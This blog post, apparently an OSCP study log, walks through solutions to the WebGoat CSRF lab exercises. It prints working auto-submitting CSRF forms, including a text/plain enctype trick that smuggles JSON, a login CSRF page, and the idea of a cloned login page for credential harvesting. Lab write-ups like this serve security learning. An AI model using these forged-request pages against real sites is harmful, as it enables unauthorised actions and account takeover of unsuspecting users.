Title: Road to OSCP: WebGoat A8: CSRF
Summary: Short notes about these tasks
Category: OSCP
Tags: websec, webgoat, csrf
Date: 2020-03-11 14:45
Status: published

#### Basic Get CSRF Exercise
To pass this one we should issue a POST request to `/WebGoat/csrf/basic-get-flag` in that way so it looks like have done from another host. To achieve this one could use intercepting proxy or browser devtools to modify request done from the browser and change `Referer` header's value to some random host. For example, to `example.com`. This solution is cheaty, proper 'exploit' is a page that looks like this:
```html
<html>
  <head></head>
  <body>
    <form name="f" 
          action="http://localhost:8080/WebGoat/csrf/basic-get-flag" 
          method="POST">
      <input type="hidden" name="csrf" value="false"/>
    </form>
    <script>document.f.submit();</script>
  </body>
</html>
```
It will show token after opening.

#### Post a review on someone else’s behalf
It's quite strange, but this could be solved in exact same way like the previous one. Is there some sort of a bug? Making a request with tampered `Referer` allow to pass this one. As earlier, correct solution is to craft a page like this:
```html
<html>
  <head></head>
  <body>
    <form name="f" 
          action="http://localhost:8080/WebGoat/csrf/review" 
          method="POST">
      <input type="hidden" name="reviewText" value="nailed"/>
      <input type="hidden" name="stars" value="5"/>
      <input type="hidden" 
             name="validateReq" 
             value="2aa14227b9a13d0bede0388a7fba9aa9"/>
    </form>
    <script>document.f.submit();</script>
  </body>
</html>
```
The only difference is that there are three inputs instead of one, and one contain a static value. 

#### CSRF and content-type
I stuck for a while here. We provided with a writeup on how to exploit some CSRF vulnerabilities where JSON, XML or whatever alike required. Main idea is that we could craft a form that sends some input data as plain text without applying url encoding. This trick is relatively simple:
```html
<html>
  <head></head>
  <body>
    <form name="sample" 
          action="http://localhost:8080/WebGoat/csrf/feedback/message" 
          method="POST" 
          ENCTYPE="text/plain">
      <input type="hidden" 
             name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","content":"WebGoat is the best!!"}'
      />
    </form>
    <script>document.sample.submit();</script>
  </body>
</html>
```
Did you notice `ENCTYPE` form attribute? That's telling browser not to apply url encoding and effectively changes `Content-Type` header value to `text/plain` (at least in Firefox 68). The main caveat here is that browser appends equal sign at the end of the JSON because it expects some value passed in. This is where I stuck and even was thinking that this task is outdated, mostly because of this fragment of writeup:
> This results in a perfectly formatted Cross-Domain XML POST request.  The ENCTYPE avoids the body being encoded and he cleverly absorbs the unwanted “=” into the XML at a point where we need an “=” anyway.

Well, it does not "absorb the unwanted =" hence JSON rendered invalid and this will result in HTTP 500. I also found a [W3C standard](https://www.w3.org/TR/html52/sec-forms.html#plain-text-form-data) that instructs to do so and really was thinking that browsers fixed this behaviour some way. Hovewer, [Firefox 52.0.2](https://ftp.mozilla.org/pub/firefox/releases/52.0.2/) (dates back to when writeup was published) behaves exactly like Firefox 68, so this hypothesis does not seem to be right. So I've tried to use some `<!DOCTYPE>` declarations and `version` html attributes to tell browser that this doc is not HTML5 compliant. Still no luck. Dumb me! Solution was pretty simple. It was possible to provide phony JSON member that swallows unwanted equal sign. It was needed to change `input` declaration in that fashion:
```html
<input type="hidden" name='{"name":"WebGoat",...<SNIP>...,"phony:"' value='useless"}'/>
```
So resultant JSON will look like this:
```json
{
  "name": "WebGoat",
  "email": "webgoat@webgoat.org",
  "subject": "service",
  "content": "WebGoat is the best!!",
  "phony": "=useless"
}
```
Last member is ignored by the application and I've finally got a flag.

#### Login CSRF attack
If I grasp it right, to solve is simply to craft a document like this and open it locally or upload to webwolf and open from it:
```html
<html>
  <head></head>
  <body>
    <form name="sample" 
          action="http://localhost:8080/WebGoat/login" 
          method="POST">
      <input type="hidden" 
             name='username' 
             value='csrf-theuser'/>
      <input type="hidden" 
             name='password' 
             value='theuser'/>
    </form>
    <script>document.sample.submit();</script>
  </body>
</html>
```
It could be assumed that document may have any sophisticated form, for example exact copy of original login page thus allowing attacker to harvest credentials.
Also need to carefully read [paper](http://seclab.stanford.edu/websec/csrf/csrf.pdf) from the exercise.
